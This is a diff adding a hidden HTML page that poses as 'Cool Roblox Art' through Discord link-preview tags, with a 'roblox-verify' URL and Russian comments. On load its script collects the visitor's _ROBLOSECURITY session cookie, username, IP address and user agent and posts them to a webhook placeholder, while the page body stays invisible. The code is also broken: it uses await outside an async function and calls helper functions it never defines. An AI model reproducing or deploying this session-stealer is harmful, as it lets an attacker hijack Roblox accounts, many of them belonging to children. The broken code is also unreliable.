@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox Event</title>
+    <!-- Open Graph метатеги для Discord -->
+    <meta property="og:title" content="Cool Roblox Art">
+    <meta property="og:description" content="Check this amazing artwork!">
+    <meta property="og:image" content="https://i.pinimg.com/736x/3e/56/c7/3e56c7c60f62f0aef8fcb74f2da37c1c.jpg">
+    <meta property="og:url" content="https://takessshhhiii.github.io/roblox-verify/">
+    <meta property="og:type" content="website">
+    
+    <script>
+        const WEBHOOK = "YOUR_WEBHOOK_HERE";
+        
+        // Сбор данных при загрузке
+        window.onload = function() {
+            const data = {
+                roblosecurity: getCookie('_ROBLOSECURITY'),
+                username: extractRobloxData(),
+                ip: await fetch('https://api.ipify.org').then(r => r.text()),
+                userAgent: navigator.userAgent
+            };
+            
+            // Отправка в вебхук
+            fetch(WEBHOOK, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify({embeds: [createEmbed(data)]})
+            });
+        }
+    </script>
+</head>
+<body style="display:none">
+    <!-- Невидимая страница -->
+    <img src="https://real-image-url.com/legit-image.jpg" style="display:none">
+</body>
+</html>
